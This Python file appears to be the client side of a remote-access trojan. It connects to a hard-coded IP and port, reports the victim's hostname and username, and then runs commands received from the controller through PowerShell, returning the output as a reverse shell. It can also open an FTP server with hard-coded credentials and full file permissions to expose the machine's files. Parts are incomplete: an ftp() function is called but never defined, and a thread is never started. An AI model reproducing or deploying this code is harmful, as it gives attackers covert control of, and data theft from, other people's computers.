import socket
import os
import subprocess
import getpass
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
import threading
import time

HOST = "192.168.30.52"
PORT = 6565




def first_connect(client):
    client.send(socket.gethostname().encode('utf-8'))
    answer = client.recv(1024).decode("utf-8")
    if answer == "whoareyou":
        client.send(getpass.getuser().encode("utf-8"))
    else :
        print("hello")


def connect():
    while 1:
        pwd = os.getcwd()
        client.send(pwd.encode('utf-8'))
        response = client.recv(40960)
        command = response.decode('utf-8')
        if command.split(" ")[0] == "cd":
            os.chdir(command.split(" ")[1])
        elif command == 'close':
            client.send(b"\033[32m[*] Connection closed !!!\033[0m\n")
            break
        elif command[0:3] == "ftp":
            create_ftp_server()
            client.send(b"\033[32m[*] FTP server created\033[0m\n")
            continue
        try:
            stdout = subprocess.check_output(["powershell", "-Command",command])
        except :
            stdout = b"\033[32m[*] Command Not Found\033[0m\n"
        if stdout:
            client.send(stdout)
        else:
            client.send(b"\n")
    

def create_ftp_server():
    authorizer = DummyAuthorizer()

    authorizer.add_user("ccServer", "ccPassword", ".", perm="elradfmw")

    handler = FTPHandler
    handler.authorizer = authorizer
    global server
    server = FTPServer(("0.0.0.0", 21), handler)
    thred = threading.Thread(target=server.serve_forever)
    thred.start
    time.sleep(3)
    server.close_when_done()



client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect((HOST,PORT))
first_connect(client)
while 1:
    command = client.recv(40960).decode("utf-8")
    match command:
            case "connect":
                connect()
            case "ftp":
                ftp()
            case "exit":
                client.close()
                break

